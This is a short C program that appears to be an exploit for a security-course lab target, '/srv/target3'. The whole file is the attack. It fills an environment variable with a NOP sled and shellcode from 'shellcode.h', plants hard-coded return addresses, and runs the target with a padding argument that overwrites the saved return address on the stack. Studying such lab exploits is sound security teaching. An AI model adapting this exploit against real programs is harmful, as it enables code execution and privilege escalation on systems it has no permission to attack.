#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* TARGET = "/srv/target3";
const int ENV_SIZE = 400;
const uint32_t BASE_ADDR = 0xffffdec0;
const int NOP_SIZE = 201;
const char NOP_CHAR = 0x90;
const int RET_OFFSET = 4;

const uint32_t START_ADDR = BASE_ADDR + RET_OFFSET;
const uint32_t SECOND_ADDR = BASE_ADDR + 2 * RET_OFFSET;
const char PADDING[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";

void prepareEnvironment(char *env) {
    memset(env, NOP_CHAR, ENV_SIZE - 1);
    *((uint32_t *)(env)) = START_ADDR;
    *((uint32_t *)(env + RET_OFFSET)) = SECOND_ADDR;
    memcpy(env + NOP_SIZE, shellcode, sizeof(shellcode));
    env[ENV_SIZE - 1] = '\0';
}

int main(void) {
    char *args[] = {TARGET, PADDING, NULL};
    char env[ENV_SIZE];

    prepareEnvironment(env);

    char *envp[] = {env};

    execve(TARGET, args, envp);
    fprintf(stderr, "execve failed.\n");

    return 0;
}